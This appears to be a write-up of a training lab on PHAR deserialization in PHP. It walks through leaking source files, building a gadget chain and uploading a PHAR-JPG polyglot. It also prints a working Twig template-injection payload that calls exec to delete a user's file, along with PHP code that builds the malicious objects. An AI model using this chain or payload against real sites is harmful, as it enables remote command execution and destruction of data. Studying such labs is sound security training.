# Lab 10 — PHAR Deserialization and a Custom Gadget Chain

## Objective

Use PHAR deserialization with a custom gadget chain to delete:

```text
/home/carlos/morale.txt
```

Credentials:

```text
wiener:peter
```

## Steps

1. Identify the avatar upload functionality.
2. Upload a valid JPG.
3. Observe that the avatar is loaded through:

```text
GET /cgi-bin/avatar.php?avatar=wiener
```

4. Request `/cgi-bin` and identify:
   - `Blog.php`
   - `CustomTemplate.php`
5. Retrieve their source using `.php~` backup files.
6. Identify the gadget chain involving:
   - `Blog->desc`
   - `CustomTemplate->lockFilePath`
7. Observe that `file_exists()` is called on `lockFilePath`.
8. Identify the Twig template engine.
9. Use the documented Twig SSTI payload:

```text
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
```

10. Create objects equivalent to:

```php
class CustomTemplate {}
class Blog {}

$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;
```

11. Create a PHAR-JPG polyglot containing the serialized object/metadata.
12. Upload it as the avatar.
13. Change the request to:

```http
GET /cgi-bin/avatar.php?avatar=phar://wiener
```

14. Send the request.

## Learning point

PHAR metadata can introduce implicit deserialization through filesystem operations, allowing existing magic methods and gadget chains to be triggered without an explicit `unserialize()` call.
